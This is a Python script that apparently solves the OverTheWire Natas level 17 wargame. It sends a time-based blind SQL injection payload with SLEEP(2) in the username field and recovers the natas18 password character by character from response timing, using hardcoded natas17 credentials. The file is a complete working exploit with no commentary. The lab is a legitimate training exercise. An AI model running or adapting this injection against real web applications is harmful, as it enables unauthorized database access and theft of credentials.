#!/usr/bin/python3
import requests
import string
import time
username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url = 'http://'+username+'.natas.labs.overthewire.org/'
session = requests.session()
alphabet = string.ascii_letters+string.digits
secret=""
while len(password) != len(secret):

    for ch in alphabet:
        #print("Trying string:\t"+secret+ch)
        data = {'username' : 'natas18" AND password LIKE BINARY "'+secret+ch+'%" AND SLEEP(2)# '}
        start = time.time()
        response = session.post(url,data = data,auth = (username, password))
        content = response.text

        #print(content)
        end = time.time()
        if(end-start > 1):
            secret = secret+ch
            break;
print("Password for natas18 is: "+secret)
